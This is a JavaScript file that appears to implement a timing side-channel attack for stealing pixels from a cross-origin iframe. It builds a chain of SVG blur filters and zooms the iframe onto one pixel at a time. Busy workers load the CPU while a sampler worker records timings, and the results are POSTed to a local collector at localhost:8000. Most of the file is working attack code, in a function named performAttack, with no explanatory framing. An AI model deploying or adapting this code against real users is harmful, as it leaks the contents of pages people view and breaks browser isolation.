const IMAGE_SIZE = 2000
const SQUARE_SIZE = IMAGE_SIZE / 100

function createFilterStack() {
    const defs = document.querySelector('defs');

    const filterStack = document.createElementNS("http://www.w3.org/2000/svg", "filter");
    filterStack.setAttribute("id", "filter-stack");
    filterStack.setAttribute("x", "0");
    filterStack.setAttribute("y", "0");
    filterStack.setAttribute("width", "100%");
    filterStack.setAttribute("height", "100%");

    const feColorMatrix = document.createElementNS("http://www.w3.org/2000/svg", 'feColorMatrix');
    feColorMatrix.setAttribute("in", "SourceGraphic");
    feColorMatrix.setAttribute("result", "grayscale")
    feColorMatrix.setAttribute("type", "matrix");
    feColorMatrix.setAttribute("values", "0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0");

    filterStack.appendChild(feColorMatrix);

    const feComponentTransfer = document.createElementNS("http://www.w3.org/2000/svg", 'feComponentTransfer');
    feComponentTransfer.setAttribute("in", "grayscale");
    feComponentTransfer.setAttribute("result", "binary");
    const feFuncR = document.createElementNS("http://www.w3.org/2000/svg", 'feFuncR');
    feFuncR.setAttribute("type", "discrete");
    feFuncR.setAttribute("tableValues", "0 1");
    const feFuncG = document.createElementNS("http://www.w3.org/2000/svg", 'feFuncG');
    feFuncG.setAttribute("type", "discrete");
    feFuncG.setAttribute("tableValues", "0 1");
    const feFuncB = document.createElementNS("http://www.w3.org/2000/svg", 'feFuncB');
    feFuncB.setAttribute("type", "discrete");
    feFuncB.setAttribute("tableValues", "0 1");
    
    feComponentTransfer.appendChild(feFuncR);
    feComponentTransfer.appendChild(feFuncG)
    feComponentTransfer.appendChild(feFuncB);

    filterStack.appendChild(feComponentTransfer);

    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // Make random noise image
    for (let y = 0; y < IMAGE_SIZE; y += SQUARE_SIZE) {
        for (let x = 0; x < IMAGE_SIZE; x += SQUARE_SIZE) {            
            ctx.fillStyle = `rgb(${Math.floor(Math.random() * 255)} ${Math.floor(Math.random() * 255)} ${Math.floor(Math.random() * 255)})`;
            ctx.fillRect(x, y, SQUARE_SIZE, SQUARE_SIZE);
        }
    }

    const noiseImage = document.createElementNS("http://www.w3.org/2000/svg", 'feImage');
    noiseImage.setAttribute("href", canvas.toDataURL());
    noiseImage.setAttribute("result", "noise-image");

    const feComposite = document.createElementNS("http://www.w3.org/2000/svg", "feComposite");
    feComposite.setAttribute("in", "binary");
    feComposite.setAttribute("in2", "noise-image");
    feComposite.setAttribute("operator", "arithmetic");
    feComposite.setAttribute("k1", "0.98");
    feComposite.setAttribute("k2", "0");
    feComposite.setAttribute("k3", "0.01");
    feComposite.setAttribute("k4", "0");
    feComposite.setAttribute("result", "composed-image");

    filterStack.appendChild(noiseImage);
    filterStack.appendChild(feComposite);

    let gaussBlur = document.createElementNS("http://www.w3.org/2000/svg", "feGaussianBlur");
    gaussBlur.setAttribute("in", "composed-image");
    gaussBlur.setAttribute("stdDeviation", "0.999");
    gaussBlur.setAttribute("result", "blur0")
    filterStack.appendChild(gaussBlur);

    // Apply Gaussian Blur filter in a chain
    for (let i = 1; i <= 50; i++) {
        let gaussBlur = document.createElementNS("http://www.w3.org/2000/svg", "feGaussianBlur");
        gaussBlur.setAttribute("in", "blur" + (i-1));
        gaussBlur.setAttribute("stdDeviation", "0.999");
        gaussBlur.setAttribute("result", "blur" + i)
        filterStack.appendChild(gaussBlur);
    }

    defs.appendChild(filterStack);
}

function applyFilter() {
    const div = document.getElementById("target-pixel");

    div.style.filter = "url(#filter-stack)";
}

function clearFilter() {
    const filterStack = document.getElementById("filter-stack");
    filterStack.remove();
}

function animateFrame() {
    clearFilter();
    createFilterStack();
    applyFilter();
    requestAnimationFrame(animateFrame);
}

function startRun() {
    const samplerWorker = new Worker('sampler.js');

    createFilterStack();
    applyFilter();

    requestAnimationFrame(animateFrame);

    samplerWorker.postMessage(200000);

    samplerWorker.onmessage = function(event) {
        let res = new Promise((res, rej) => {
            fetch("http://localhost:8000/api", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(event.data)
            }).then(res)
        });
        res.then(() => {
            samplerWorker.terminate();
            clearFilter();
            window.close();
            return;
        });
    }
}

// let busyWorkers = [];

// for (let i = 0; i < 6; i++) {
//     const busyWorker = new Worker("busy.js");
//     busyWorkers.push(busyWorker);
// }

// busyWorkers.forEach(busyWorker => {
//     busyWorker.postMessage(123456789);
// });

// startRun();

createFilterStack();
applyFilter();

function performAttack() {
        let imageSize = 28;
        let seconds = 1;

        const samplerWorker = new Worker('sampler.js');

        samplerWorker.postMessage(imageSize*imageSize*1000*seconds);

        let count = 0
    
        requestAnimationFrame(animateFrame);

        for (let row = 0; row < imageSize; row++) {
            for (let column = 0; column < imageSize; column++) {
                setTimeout(() => {
                    console.log(`Starting worker for (${row},${column})`);

                    //#region Apply Clip Path (Focus on Pixel)
                    const iframe = document.getElementById("target-iframe");
                    iframe.style.clipPath = `inset(${row}px ${(IMAGE_SIZE-1)-column}px ${(IMAGE_SIZE-1)-row}px ${column}px)`;
                    iframe.style.transformOrigin = `${column}px ${row}px`;
                    iframe.style.transform = "scale(2000)";
                    //#endregion
                    
                }, count++ * 1000);
            }
        }

        samplerWorker.onmessage = function(event) {
            let res = new Promise((res, rej) => {
                fetch("http://localhost:8000/api", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(event.data)
                }).then(res)
            });
            res.then(() => {
                samplerWorker.terminate();
                busyWorkers.forEach(busyWorker => {
                    busyWorker.terminate();
                });
                clearFilter();
                window.close();
                return;
            });
        }
    }

let busyWorkers = [];

for (let i = 0; i < 14; i++) {
    const busyWorker = new Worker("busy.js");
    busyWorkers.push(busyWorker);
}

busyWorkers.forEach(busyWorker => {
    busyWorker.postMessage(123456789);
});

performAttack();